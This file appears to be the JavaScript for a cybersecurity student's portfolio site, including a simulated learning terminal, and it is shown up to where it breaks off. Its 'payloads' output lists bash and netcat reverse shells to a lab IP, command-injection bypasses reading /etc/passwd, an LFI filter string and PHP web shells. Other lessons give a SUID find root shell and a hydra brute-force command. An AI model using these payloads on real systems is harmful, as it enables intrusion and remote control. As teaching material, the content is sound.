/**
 * Portfolio Interactive System · Mihraj Mashhoor K
 * Version: 4.0.0
 * 
 * Features:
 *  1. Global Command Palette (Cmd+K / Ctrl+K / /)
 *  2. Full-Fidelity Cyber Command & Learning Sandbox Engine:
 *     - Linux Core: ls, pwd, cd, cat, grep, find, chmod, ps, uname, ifconfig, df, free, history, sudo
 *     - Security Tools: nmap, gobuster, ffuf, hydra, hashcat, john, sqlmap, nc, searchsploit, msfconsole
 *     - Interactive Learning Modules: learn [linux|nmap|web|passwords|privesc|metasploit]
 *     - Cheatsheets: cheatsheet [tool]
 *     - Lab Targets: targets
 *     - HTML5 Canvas Digital Matrix Rain
 *     - Dynamic Live Accent Theme Switcher (emerald, cyan, amber, rose, purple)
 *     - Tab Autocompletion & Command History
 *  3. Global Reading Progress Indicator (Fixed 2.5px Top Bar)
 *  4. Floating Cyber Dock (Terminal Quick Launcher, Command Search, Back to Top)
 *  5. Toast Notification Engine (showToast)
 *  6. 1-Click Code Copy with Syntax Line Stripping
 *  7. Dynamic Project Category Filtering (index.html)
 *  8. Numbers & Metrics Count-Up Animation
 */

(function () {
  'use strict';

  // Determine relative root based on current URL path
  let root = './';
  if (window.location.pathname.includes('/handbook/modules/')) {
    root = '../../';
  } else if (window.location.pathname.includes('/projects/') || window.location.pathname.includes('/handbook/')) {
    root = '../';
  }

  // =========================================================================
  // 1. DATASET FOR COMMAND PALETTE SEARCH
  // =========================================================================
  const SEARCH_ITEMS = [
    // Core Platform Hubs & Practice Labs
    { title: 'Cybersecurity Learning Hub', type: 'LEARNING', url: root + 'learning.html', desc: '12 core cybersecurity disciplines: Networking, Linux, Web, Recon, PrivEsc, Cloud, Docker, Tools', keywords: 'learning hub networking linux web security recon enumeration privesc auth wireless cloud docker osint' },
    { title: 'Interactive Security Toolkit', type: 'TOOLKIT', url: root + 'tools.html', desc: '13 zero-telemetry in-browser tools: JWT Inspector, CIDR Calc, Base64, Hash ID, CSP Analyzer', keywords: 'toolkit tools jwt base64 url hash identifier cidr calculator csp headers entropy regex json timestamp' },
    { title: 'Interactive Nmap Command Builder', type: 'TOOLKIT', url: root + 'tools.html#nmap-builder', desc: 'Customizable Nmap command builder with live flag explanations & educational safety rules', keywords: 'nmap builder command generator scan ports syn os detection nse scripts timing verbosity' },
    { title: 'Cybersecurity Tool Database (20 Tools)', type: 'DATABASE', url: root + 'tools.html#tool-db', desc: 'Complete manual for 20 essential tools: Nmap, Burp, Wireshark, Metasploit, ffuf, Hydra, SQLMap', keywords: 'tool database nmap burp suite wireshark metasploit ffuf gobuster nikto netcat curl dig whois amass john hashcat hydra tcpdump sqlmap responder' },
    { title: 'Practical Cybersecurity Labs Hub', type: 'LABS', url: root + 'labs.html', desc: '12 safe, self-contained interactive cybersecurity labs with hints, answers, and defense', keywords: 'labs practical challenges headers permissions suid auth idor sqli xss csrf network logs jwt crypto' },
    { title: '12-Stage Pentest Methodology', type: 'METHODOLOGY', url: root + 'methodology.html', desc: 'Comprehensive penetration testing lifecycle: Scope to Retesting with tools & commands', keywords: 'methodology pentest stages scope recon enumeration exploit privesc reporting remediation retesting' },
    { title: 'Attack / Detection / Defense Matrix', type: 'METHODOLOGY', url: root + 'methodology.html#matrix', desc: 'Tri-perspective blueprints for 10 major vulnerabilities: XSS, SQLi, CSRF, IDOR, SSRF, CMDi', keywords: 'matrix attack detection defense xss sqli csrf idor ssrf path traversal cmdi auth privesc credentials' },
    { title: 'Interactive Cybersecurity Roadmap', type: 'ROADMAP', url: root + 'roadmap.html', desc: '11-domain cybersecurity curriculum with localStorage progress tracking', keywords: 'roadmap tracker progress networking linux programming web recon pentest privesc active directory cloud soc defense' },
    { title: 'Cybersecurity Glossary & Terminology', type: 'GLOSSARY', url: root + 'glossary.html', desc: '60+ indexed cybersecurity definitions: CIA Triad, CVE, CVSS, XSS, SUID, JWT, TLS, CIDR, SIEM', keywords: 'glossary dictionary terms cia triad cve cvss cwe xss csrf ssrf idor rce lfi suid jwt oauth tls dns cidr nat siem edr' },
    { title: 'Interactive Terminal Lab', type: 'SANDBOX', url: root + 'terminal-lab.html', desc: 'Interactive Linux & cybersecurity tools learning simulator with simulated outputs', keywords: 'terminal lab linux sandbox practice nmap hydra gobuster sqlmap metasploit fake outputs learn practice' },
    { title: 'Offensive Payloads Cheatsheet', type: 'CHEATSHEET', url: root + 'payloads.html', desc: 'TryHackMe-style cheatsheet for RCE, CMDi filter bypasses, LFI wrappers & reverse shells', keywords: 'payloads rce lfi cmdi command injection reverse shell bash php netcat bypass cheatsheet tryhackme' },

    // Case Studies
    { title: 'OpenCode Persistent Memory', type: 'CASE STUDY', url: root + 'projects/opencode-persistent-memory.html', desc: 'SQLite-authoritative local persistent memory & dual-engine retrieval for OpenCode', keywords: 'memory opencode sqlite chroma ollama local ai gemma nomic vector source verified' },
    { title: 'SentinelAI: Vuln Intelligence', type: 'CASE STUDY', url: root + 'projects/sentinelai.html', desc: 'AI-powered vulnerability intelligence & knowledge platform with MITRE ATT&CK', keywords: 'sentinelai cve mitre attack rag knowledge graphs triage security' },
    { title: 'Autonomous Pentesting Agent', type: 'CASE STUDY', url: root + 'projects/autonomous-pentesting-agent.html', desc: 'AI-assisted authorized security testing framework on owned targets', keywords: 'pentest offensive agent kali ollama nmap burp qwen autonomous' },
    { title: 'CyberAI: Local Security Platform', type: 'CASE STUDY', url: root + 'projects/cyberai.html', desc: 'Local AI cybersecurity agent platform with Qwen3-Coder 30B & Kali Linux', keywords: 'cyberai local inference ollama qwen security automation agents' },
    { title: 'Local AI Compute Stack', type: 'CASE STUDY', url: root + 'projects/local-ai-compute-stack.html', desc: 'Dedicated private AI inference architecture with zero telemetry', keywords: 'compute stack inference local ai hardware vram quantization ollama' },
    { title: 'AI Application Platform', type: 'CASE STUDY', url: root + 'projects/ai-application-platform.html', desc: 'Full-stack AI developer ecosystem with private local models', keywords: 'ai application platform fullstack developer local models api' },
    { title: 'Cybersecurity Handbook (Case Study)', type: 'CASE STUDY', url: root + 'projects/cybersecurity-handbook.html', desc: 'Case study of the Ethical Hacker Command Handbook documentation system', keywords: 'handbook case study documentation knowledge base' },

    // Core Pages & Sections
    { title: 'Browser Resume', type: 'PAGE', url: root + 'resume.html', desc: 'Interactive browser resume with certifications, experience & skills', keywords: 'resume cv experience education tryhackme credentials' },
    { title: 'Certificates & Credentials', type: 'PAGE', url: root + 'certificates.html', desc: 'Verified security certificates: Google Cyber, TryHackMe Pre-Security & Cyber 101', keywords: 'certificates credentials google tryhackme coursera verify' },
    { title: 'Digital Certificate Viewer', type: 'PAGE', url: root + 'certificate-viewer.html', desc: 'Interactive digital credential inspection viewer with high-res zoom', keywords: 'certificate viewer zoom verification credential id' },
    { title: 'Cybersecurity Handbook (KB)', type: 'KNOWLEDGE BASE', url: root + 'handbook/index.html', desc: '15-module reference handbook covering Nmap, Linux, Metasploit & Web Security', keywords: 'handbook commands cheat sheet nmap metasploit linux reference' },
    { title: 'About & Security Philosophy', type: 'SECTION', url: root + 'index.html#about', desc: 'Engineering background, student journey & security philosophy', keywords: 'about bio profile philosophy background' },
    { title: 'TryHackMe Achievements', type: 'SECTION', url: root + 'index.html#achievements', desc: 'Global Top 2% ranking, 140+ rooms completed, badges', keywords: 'tryhackme thm achievements ranking stats top 2% rooms' },
    { title: 'Skills & Technical Domains', type: 'SECTION', url: root + 'index.html#skills', desc: '9 specialized security domains across offensive & defensive tech', keywords: 'skills recon web network privesc wireless python ai' },
    { title: 'Operational Toolkit', type: 'SECTION', url: root + 'index.html#toolkit', desc: 'Categorized tools: Nmap, Burp Suite, Hydra, Metasploit, Wireshark', keywords: 'toolkit tools nmap burp hydra hashcat metasploit wireshark' },
    { title: 'Practical Lab & Workflows', type: 'SECTION', url: root + 'index.html#lab', desc: 'Hands-on methodology pipeline & personal lab setup', keywords: 'lab workflow methodology practical recon enum exploit' },
    { title: 'Projects Showcase', type: 'SECTION', url: root + 'index.html#projects', desc: 'Explore all major security engineering and AI systems', keywords: 'projects showcase portfolio sentinelai cyberai' },
    { title: 'Contact & Transmit Inquiries', type: 'SECTION', url: root + 'index.html#contact', desc: 'Get in touch for internships, security research & collaboration', keywords: 'contact email linkedin github message transmit' },

    // Handbook Modules
    { title: 'Nmap Scanning Reference', type: 'MODULE', url: root + 'handbook/nmap.html', desc: 'Port discovery, service versioning & NSE script auditing guide', keywords: 'nmap port scan nse scripts banner syn recon' },
    { title: 'Linux Essentials for Practitioners', type: 'MODULE', url: root + 'handbook/linux.html', desc: 'Core Linux security commands, file permissions & SUID analysis', keywords: 'linux bash suid permissions terminal cli' },
    { title: 'Metasploit Framework Guide', type: 'MODULE', url: root + 'handbook/metasploit.html', desc: 'Exploitation concepts, payload generation & Meterpreter sessions', keywords: 'metasploit msfconsole payload meterpreter exploit' },
    { title: 'SearchSploit & Vuln Research', type: 'MODULE', url: root + 'handbook/searchsploit.html', desc: 'Offline CVE searching, exploit verification & CVSS evaluation', keywords: 'searchsploit cve exploit-db vuln research' },

    // Quick Actions
    { title: 'Download CV (PDF)', type: 'ACTION', url: root + 'CV_2026_UPDATED.pdf', desc: 'Download latest technical resume PDF', keywords: 'download cv resume pdf updated' },
    { title: 'Open Interactive Terminal', type: 'ACTION', action: 'terminal', desc: 'Launch browser-based hacker CLI terminal (~ / `)', keywords: 'terminal cli shell quake bash prompt console' },
    { title: 'GitHub Profile ↗', type: 'EXTERNAL', url: 'https://github.com/mihrajmashoor8301-collab', desc: 'Browse open-source security code and repositories', keywords: 'github repo code git source' },
    { title: 'TryHackMe Profile ↗', type: 'EXTERNAL', url: 'https://tryhackme.com/p/mihrajmashoor8301', desc: 'View live TryHackMe badges, room matrix & ranking', keywords: 'tryhackme live profile badges rooms' }
  ];

  // =========================================================================
  // 2. TOAST NOTIFICATION ENGINE
  // =========================================================================
  function showToast(message, type = 'info', duration = 3000) {
    let container = document.getElementById('cyber-toast-container');
    if (!container) {
      container = document.createElement('div');
      container.id = 'cyber-toast-container';
      container.style.cssText = 'position:fixed;bottom:1.5rem;left:1.5rem;z-index:999999;display:flex;flex-direction:column;gap:0.5rem;pointer-events:none;';
      document.body.appendChild(container);
    }

    const toast = document.createElement('div');
    toast.style.cssText = `
      pointer-events:auto;
      padding:0.65rem 1rem;
      border-radius:0.75rem;
      font-size:12px;
      font-family:'JetBrains Mono', monospace;
      display:flex;
      align-items:center;
      gap:0.5rem;
      backdrop-filter:blur(12px);
      -webkit-backdrop-filter:blur(12px);
      transition:all 0.3s cubic-bezier(0.16,1,0.3,1);
      transform:translateY(20px);
      opacity:0;
    `;

    if (type === 'success') {
      toast.style.background = 'rgba(14, 19, 27, 0.95)';
      toast.style.border = '1px solid rgba(78, 222, 163, 0.5)';
      toast.style.color = '#4EDEA3';
      toast.style.boxShadow = '0 8px 30px rgba(0, 0, 0, 0.6), 0 0 15px rgba(78, 222, 163, 0.2)';
      toast.innerHTML = `<span class="material-symbols-outlined" style="font-size:16px;">check_circle</span><span>${escapeHtml(message)}</span>`;
    } else if (type === 'warn') {
      toast.style.background = 'rgba(14, 19, 27, 0.95)';
      toast.style.border = '1px solid rgba(245, 158, 11, 0.5)';
      toast.style.color = '#F59E0B';
      toast.style.boxShadow = '0 8px 30px rgba(0, 0, 0, 0.6), 0 0 15px rgba(245, 158, 11, 0.2)';
      toast.innerHTML = `<span class="material-symbols-outlined" style="font-size:16px;">warning</span><span>${escapeHtml(message)}</span>`;
    } else {
      toast.style.background = 'rgba(14, 19, 27, 0.95)';
      toast.style.border = '1px solid rgba(76, 215, 246, 0.5)';
      toast.style.color = '#4CD7F6';
      toast.style.boxShadow = '0 8px 30px rgba(0, 0, 0, 0.6), 0 0 15px rgba(76, 215, 246, 0.2)';
      toast.innerHTML = `<span class="material-symbols-outlined" style="font-size:16px;">terminal</span><span>${escapeHtml(message)}</span>`;
    }

    container.appendChild(toast);

    const raf = typeof requestAnimationFrame === 'function' ? requestAnimationFrame : (cb) => setTimeout(cb, 16);
    raf(() => {
      toast.style.transform = 'translateY(0)';
      toast.style.opacity = '1';
    });

    setTimeout(() => {
      toast.style.transform = 'translateY(12px)';
      toast.style.opacity = '0';
      setTimeout(() => toast.remove(), 300);
    }, duration);
  }
  window.showToast = showToast;

  // =========================================================================
  // 3. GLOBAL READING PROGRESS BAR (FIXED TOP)
  // =========================================================================
  function initProgressBar() {
    if (document.getElementById('reading-progress-bar')) return;
    const bar = document.createElement('div');
    bar.id = 'reading-progress-bar';
    bar.style.cssText = `
      position:fixed;
      top:0;
      left:0;
      height:2.5px;
      width:0%;
      background:linear-gradient(90deg, #4EDEA3 0%, #4CD7F6 100%);
      z-index:999999;
      transition:width 0.08s ease-out;
      box-shadow:0 0 12px rgba(78, 222, 163, 0.8);
      pointer-events:none;
    `;
    document.body.appendChild(bar);

    window.addEventListener('scroll', () => {
      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
      if (docHeight > 0) {
        const scrolled = (window.scrollY / docHeight) * 100;
        bar.style.width = Math.min(100, Math.max(0, scrolled)) + '%';
      }
    }, { passive: true });
  }

  // =========================================================================
  // 4. FLOATING CYBER DOCK (BOTTOM RIGHT CONTROLS)
  // =========================================================================
  function initFloatingDock() {
    if (document.getElementById('cyber-floating-dock')) return;
    const dock = document.createElement('div');
    dock.id = 'cyber-floating-dock';
    dock.style.cssText = `
      position:fixed;
      bottom:1.25rem;
      right:1.25rem;
      z-index:90;
      display:flex;
      align-items:center;
      gap:0.5rem;
      font-family:'JetBrains Mono', monospace;
    `;

    dock.innerHTML = `
      <!-- Quick Terminal Pill -->
      <button data-trigger-term class="group relative flex items-center gap-1.5 px-3 py-2 rounded-xl bg-surface-raised/90 hover:bg-surface-raised border border-primary/40 hover:border-primary shadow-[0_4px_25px_rgba(0,0,0,0.6)] backdrop-blur-md text-primary text-xs font-bold transition-all cursor-pointer hover:shadow-[0_0_20px_rgba(78,222,163,0.3)] hover:-translate-y-0.5" title="Launch Interactive Cyber CLI (Press ~)">
        <span class="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
        <span class="material-symbols-outlined text-sm">terminal</span>
        <span class="hidden sm:inline">CLI (~)</span>
      </button>

      <!-- Quick Search Pill -->
      <button data-trigger-cmd class="flex items-center gap-1 px-2.5 py-2 rounded-xl bg-surface-raised/90 hover:bg-surface-raised border border-border-hairline hover:border-secondary/50 shadow-[0_4px_25px_rgba(0,0,0,0.6)] backdrop-blur-md text-on-surface-variant hover:text-secondary text-xs transition-all cursor-pointer hover:-translate-y-0.5" title="Search Portfolio (Cmd+K or /)">
        <span class="material-symbols-outlined text-sm">search</span>
        <span class="hidden sm:inline text-[11px] text-outline">⌘K</span>
      </button>

      <!-- Scroll to Top Button -->
      <button id="scroll-to-top-btn" class="hidden items-center justify-center w-9 h-9 rounded-xl bg-surface-raised/90 hover:bg-surface-raised border border-border-hairline hover:border-primary shadow-[0_4px_25px_rgba(0,0,0,0.6)] backdrop-blur-md text-on-surface-variant hover:text-primary transition-all cursor-pointer hover:-translate-y-0.5" title="Back to Top">
        <span class="material-symbols-outlined text-base">arrow_upward</span>
      </button>
    `;

    document.body.appendChild(dock);

    const topBtn = document.getElementById('scroll-to-top-btn');
    if (topBtn) {
      window.addEventListener('scroll', () => {
        if (window.scrollY > 300) {
          topBtn.style.display = 'flex';
        } else {
          topBtn.style.display = 'none';
        }
      }, { passive: true });

      topBtn.addEventListener('click', () => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  // =========================================================================
  // 5. UNIFIED CYBER COMMAND & PRACTICE SIMULATOR ENGINE
  // =========================================================================
  const VIRTUAL_FS = {
    '/home/guest/lab': {
      'targets.txt': `# AUTHORIZED LAB TARGETS
10.10.110.45    starlight-web.lab       # Ubuntu 22.04 LTS (Apache 2.4.52, vsftpd 2.3.4, MySQL 8.0)
10.10.10.150    corp-ad.lab             # Windows Server 2022 (Active Directory, SMB, Kerberos)
127.0.0.1       localhost               # Kali Linux 6.8 (Ollama 11434, ChromaDB 8000, SSH 22)`,
      'recon.sh': `#!/usr/bin/env bash
# Automated Recon Pipeline - Mihraj Mashhoor K
TARGET="10.10.110.45"
echo "[+] Probing $TARGET with Nmap SYN Stealth & Service Discovery..."
nmap -sS -sV -sC -T4 "$TARGET" -oN scan.log
echo "[+] Fuzzing web directories with Gobuster..."
gobuster dir -u "http://$TARGET" -w wordlist.txt`,
      'notes.txt': `==================================================
ENGAGEMENT NOTES - STARLIGHT INTERNAL LAB
==================================================
[Recon] Found port 21 (vsftpd 2.3.4) - Check for known backdoor (CVE-2011-2523).
[Web] Found /admin portal at http://10.10.110.45/admin.
[Auth] Default credentials admin:Password123 tested on SSH.
[SUID] Target has /usr/bin/find with SUID flag set (PrivEsc vector!).`,
      'id_rsa': `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBA1mZ2h3e47kL90Qx83... [SIMULATED PRIVATE KEY - AUTHORIZED LAB ONLY]
-----END OPENSSH PRIVATE KEY-----`,
      'hashes.txt': `admin:e10adc3949ba59abbe56e057f20f883e (MD5 -> 123456)
analyst:098f6bcd4621d373cade4e832627b4f6 (MD5 -> test)
root:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 (SHA256 -> password)`,
      'wordlist.txt': `admin
login
password
Password123
secret
uploads
api
config
database
backup`,
      'scan.log': `# Nmap 7.94 scan initiated 2026-10-04
Nmap scan report for starlight-web.lab (10.10.110.45)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 2.3.4 (Backdoor vulnerable)
22/tcp   open  ssh          OpenSSH 8.9p1 Ubuntu
80/tcp   open  http         Apache httpd 2.4.52 ((Ubuntu))
445/tcp  open  netbios-ssn  Samba 4.15.5
3306/tcp open  mysql        MySQL 8.0.35`
    },
    '/etc': {
      'passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
mihraj:x:1000:1000:Mihraj Mashhoor K,,,:/home/mihraj:/bin/bash
guest:x:1001:1001:Lab Guest Practitioner,,,:/home/guest:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false`,
      'os-release': `NAME="Kali GNU/Linux"
VERSION="2026.3"
ID=kali
VERSION_ID="2026.3"
PRETTY_NAME="Kali GNU/Linux Rolling"
HOME_URL="https://www.kali.org/"`
    }
  };

  let currentWorkingDir = '/home/guest/lab';

  const CyberCommandEngine = {
    run: function (cmdRaw) {
      const cmd = cmdRaw.trim();
      if (!cmd) return '';

      const parts = cmd.split(/\s+/);
      const action = parts[0].toLowerCase();
      const arg1 = parts[1] || '';
      const arg2 = parts[2] || '';
      const fullArgs = parts.slice(1).join(' ').toLowerCase();

      // Metasploit Interactive Sub-Shell
      if (cmd.startsWith('msf') || cmd === 'use exploit/unix/ftp/vsftpd_234_backdoor' || cmd === 'exploit' || cmd === 'run' || cmd.startsWith('set rhosts')) {
        return handleMsfCommands(cmd);
      }

      switch (action) {
        // =====================================================================
        // GUIDED LEARNING & CHEATSHEETS
        // =====================================================================
        case 'payloads':
        case 'payload':
        case 'rce':
        case 'lfi':
        case 'revshell': {
          return `
            <div class="p-3 rounded bg-canvas-base border border-danger-critical/40 space-y-2 text-xs">
              <div class="text-danger-critical font-bold flex items-center justify-between">
                <span class="flex items-center gap-1.5">
                  <span class="material-symbols-outlined text-sm">security</span>
                  <span>OFFENSIVE SECURITY PAYLOADS &amp; BYPASS CHEATSHEET</span>
                </span>
                <a href="${root}payloads.html" class="px-2 py-0.5 rounded bg-danger-critical/20 text-danger-critical hover:bg-danger-critical hover:text-canvas-base text-[10px] font-bold transition-all">OPEN FULL HUB ↗</a>
              </div>
              <div class="text-outline text-[11px]">Instant TryHackMe &amp; CTF-style exploitation payloads:</div>
              <div class="space-y-1.5 text-[11px] font-mono">
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <span class="text-primary font-bold">Bash TCP Reverse Shell:</span><br/>
                  <code class="text-on-surface select-all">bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1</code>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <span class="text-secondary font-bold">Netcat OpenBSD FIFO (No -e):</span><br/>
                  <code class="text-on-surface select-all">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f</code>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <span class="text-warning font-bold">Command Injection Space Bypass (\${IFS}):</span><br/>
                  <code class="text-on-surface select-all">cat\${IFS}/etc/passwd</code> · <code class="text-on-surface select-all">{cat,/etc/passwd}</code>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <span class="text-primary font-bold">LFI Source Code Disclosure Filter:</span><br/>
                  <code class="text-on-surface select-all">php://filter/convert.base64-encode/resource=index.php</code>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <span class="text-danger-critical font-bold">Minimal PHP Web Shell:</span><br/>
                  <code class="text-on-surface select-all">&lt;?php system(\$_GET['cmd']); ?&gt;</code> · <code class="text-on-surface select-all">&lt;?=\`\$_GET[0]\`;</code>
                </div>
              </div>
              <div class="text-outline text-[10px]">Tip: Visit <a href="${root}payloads.html" class="text-danger-critical underline font-bold">payloads.html</a> for the interactive generator with dynamic LHOST/LPORT replacement!</div>
            </div>
          `;
        }

        case 'roadmap':
        case 'methodology':
        case 'stages': {
          return `
            <div class="p-3 rounded bg-canvas-base border border-primary/40 space-y-2 text-xs">
              <div class="text-primary font-bold flex items-center justify-between">
                <span class="flex items-center gap-1.5">
                  <span class="material-symbols-outlined text-sm">route</span>
                  <span>STRUCTURED 6-STAGE PENETRATION TESTING ROADMAP</span>
                </span>
                <span class="px-2 py-0.5 rounded bg-primary/20 text-primary text-[10px] font-bold">GUIDED LAB</span>
              </div>
              <div class="text-outline text-[11px]">Systematic offensive security methodology implemented in the Terminal Lab:</div>
              <div class="space-y-1.5 text-[11px] font-mono">
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-primary font-bold">
                    <span>STAGE 01: Host Discovery &amp; Environment Inspection</span>
                    <span class="px-1.5 py-0.2 bg-primary/20 rounded text-[9px]">STEP 1/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Audit local users, default login shells, and sensitive configuration.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-primary font-bold">cat /etc/passwd</code></div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-secondary font-bold">
                    <span>STAGE 02: Network Scoping &amp; Service Interrogation</span>
                    <span class="px-1.5 py-0.2 bg-secondary/20 rounded text-[9px]">STEP 2/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Identify active IP targets and fingerprint listening daemon software versions.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-secondary font-bold">nmap -sS -sV 10.10.110.45</code></div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-warning font-bold">
                    <span>STAGE 03: Vulnerability &amp; Exploit Assessment</span>
                    <span class="px-1.5 py-0.2 bg-warning/20 rounded text-[9px]">STEP 3/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Query CVE databases and run automated vulnerability interrogation scripts.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-warning font-bold">nmap --script vuln 10.10.110.45</code></div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-secondary font-bold">
                    <span>STAGE 04: Web Directory Fuzzing &amp; SQL Injection</span>
                    <span class="px-1.5 py-0.2 bg-secondary/20 rounded text-[9px]">STEP 4/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Discover hidden administrative portals and probe GET parameters for SQLi.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-secondary font-bold">gobuster dir -u http://10.10.110.45 -w wordlist.txt</code></div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-primary font-bold">
                    <span>STAGE 05: Authentication Auditing &amp; Hash Cracking</span>
                    <span class="px-1.5 py-0.2 bg-primary/20 rounded text-[9px]">STEP 5/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Conduct targeted dictionary attacks and recover password hashes.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-primary font-bold">hydra -l admin -P wordlist.txt ssh://10.10.110.45</code></div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="flex items-center justify-between text-danger-critical font-bold">
                    <span>STAGE 06: Privilege Escalation &amp; Root Acquisition</span>
                    <span class="px-1.5 py-0.2 bg-danger-critical/20 rounded text-[9px]">STEP 6/6</span>
                  </div>
                  <div class="text-outline text-[10px]">Abuse misconfigured SUID binaries or sudoers to achieve root EUID=0.</div>
                  <div class="text-on-surface mt-1">Command: <code class="text-danger-critical font-bold">find . -exec /bin/sh -p \\; -quit</code></div>
                </div>
              </div>
              <div class="text-outline text-[10px]">Tip: Visit <a href="${root}terminal-lab.html" class="text-primary underline font-bold">terminal-lab.html</a> for the full curriculum with live stage completion tracking and expected output previews!</div>
            </div>
          `;
        }

        case 'learn':
        case 'tutorial':
        case 'guide':
        case 'practice': {
          const track = arg1.toLowerCase();
          if (!track) {
            return `
              <div class="space-y-2 text-xs">
                <div class="text-primary font-bold">CYBERSECURITY LEARNING SANDBOX · INTERACTIVE LESSONS</div>
                <div class="text-outline">Choose a track to view practical commands and explanations:</div>
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] font-mono">
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-primary font-bold">learn linux</span><br/>
                    <span class="text-outline">File inspection, permissions, SUID binaries &amp; grep pipelines.</span>
                  </div>
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-secondary font-bold">learn nmap</span><br/>
                    <span class="text-outline">Stealth SYN scans, version detection, NSE scripts &amp; port ranges.</span>
                  </div>
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-warning font-bold">learn web</span><br/>
                    <span class="text-outline">Directory brute-forcing with Gobuster &amp; SQL injection with SQLMap.</span>
                  </div>
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-primary font-bold">learn hydra</span><br/>
                    <span class="text-outline">Authentication cracking across SSH and FTP services.</span>
                  </div>
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-secondary font-bold">learn privesc</span><br/>
                    <span class="text-outline">Privilege escalation via SUID find and misconfigured sudoers.</span>
                  </div>
                  <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                    <span class="text-danger-critical font-bold">learn metasploit</span><br/>
                    <span class="text-outline">Exploitation console, payload handlers &amp; reverse shells.</span>
                  </div>
                </div>
                <div class="text-outline text-[11px]">Usage: Type <span class="text-primary font-bold">learn &lt;track&gt;</span> (e.g. <span class="text-secondary font-bold">learn nmap</span>) or visit <a href="${root}terminal-lab.html" class="text-primary underline font-bold">terminal-lab.html</a> for the full split-screen GUI!</div>
              </div>
            `;
          }

          if (track === 'linux') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-primary font-bold">MODULE: LINUX SYSTEM &amp; PRACTITIONER CORE</div>
                <div class="text-outline text-[11px]">Key practice commands to try right now:</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-primary font-bold">ls -la</code> : View all files, permissions (rwx), and hidden dotfiles.</div>
                  <div>• <code class="text-primary font-bold">cat /etc/passwd</code> : Inspect all local users and login shell paths.</div>
                  <div>• <code class="text-primary font-bold">find / -perm -4000 2>/dev/null</code> : Locate SUID binaries owned by root.</div>
                  <div>• <code class="text-primary font-bold">sudo -l</code> : Check commands allowed to execute as superuser without password.</div>
                  <div>• <code class="text-primary font-bold">grep -i "pass" notes.txt</code> : Filter files for credentials.</div>
                </div>
              </div>
            `;
          }

          if (track === 'nmap') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-secondary font-bold">MODULE: NMAP NETWORK RECONNAISSANCE</div>
                <div class="text-outline text-[11px]">Commands configured against target 10.10.110.45:</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-secondary font-bold">nmap -sS -sV 10.10.110.45</code> : TCP SYN stealth scan with service banner detection.</div>
                  <div>• <code class="text-secondary font-bold">nmap -sC -sV 10.10.110.45</code> : Execute safe default scripts (anonymous FTP, web titles).</div>
                  <div>• <code class="text-secondary font-bold">nmap -p- 10.10.110.45</code> : Audit all 65,535 TCP ports.</div>
                  <div>• <code class="text-secondary font-bold">nmap --script vuln 10.10.110.45</code> : Automated CVE vulnerability discovery.</div>
                </div>
              </div>
            `;
          }

          if (track === 'web') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-warning font-bold">MODULE: WEB RECON &amp; ENDPOINT FUZZING</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-warning font-bold">gobuster dir -u http://10.10.110.45 -w wordlist.txt</code> : Discover hidden folders (/admin, /uploads, /api).</div>
                  <div>• <code class="text-warning font-bold">ffuf -u http://10.10.110.45/FUZZ -w wordlist.txt</code> : High-speed endpoint fuzzing table.</div>
